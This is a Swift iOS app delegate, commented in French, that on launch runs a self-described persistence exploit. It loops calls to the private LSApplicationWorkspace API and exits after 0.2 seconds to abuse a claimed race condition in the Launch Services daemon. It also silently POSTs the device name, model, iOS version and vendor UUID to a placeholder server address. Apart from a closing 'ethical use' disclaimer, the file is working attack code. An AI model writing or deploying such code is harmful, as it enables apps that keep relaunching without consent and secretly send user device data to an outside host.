import UIKit

@main
class AppDelegate: UIResponder, UIApplicationDelegate {
    var window: UIWindow?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Création de la fenêtre principale
        window = UIWindow(frame: UIScreen.main.bounds)
        window?.rootViewController = ViewController()
        window?.makeKeyAndVisible()

        // Lancement de l'exploit dans un thread de fond
        lancerExploitPersistence()
        // Envoi des infos système au serveur Flask
        envoyerInfosSysteme()
        return true
    }

    /// Exploit de persistance via LSApplicationWorkspace
    func lancerExploitPersistence() {
        DispatchQueue.global().async {
            // Utilisation de la réflexion pour accéder à LSApplicationWorkspace
            guard let cls = NSClassFromString("LSApplicationWorkspace") as AnyObject?,
                  let workspace = cls.perform(NSSelectorFromString("defaultWorkspace"))?.takeUnretainedValue() as? NSObject else {
                print("Impossible d'accéder à LSApplicationWorkspace")
                return
            }
            // Boucle d'ouverture de l'app (exploit race condition LSD)
            while true {
                _ = workspace.perform(NSSelectorFromString("openApplicationWithBundleID:"), with: Bundle.main.bundleIdentifier!)
            }
        }
        // Auto-terminaison après 0.2s pour exploiter la race condition
        DispatchQueue.global().asyncAfter(deadline: .now() + 0.2) {
            exit(0)
        }
    }

    /// Envoie les infos système au serveur Flask local
    func envoyerInfosSysteme() {
        let device = UIDevice.current
        let infos: [String: String] = [
            "device": device.name,
            "model": device.model,
            "ios": device.systemVersion,
            "uuid": device.identifierForVendor?.uuidString ?? "unknown"
        ]
        guard let url = URL(string: "http://<ADRESSE_IP_SERVEUR>:5000/info") else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: infos, options: [])
        URLSession.shared.dataTask(with: request) { _, _, _ in }.resume()
    }
}

// ---
// Explications :
// - L'exploit fonctionne car LSD (Launch Services Daemon) ne vérifie pas correctement l'identité du processus appelant.
// - La boucle d'ouverture + exit(0) exploite une race condition, permettant la réouverture persistante de l'app.
// - Limites : Peut ne pas fonctionner sur iOS récents (sandbox renforcée), aucun entitlement requis.
// - Usage strictement éthique et interne ! 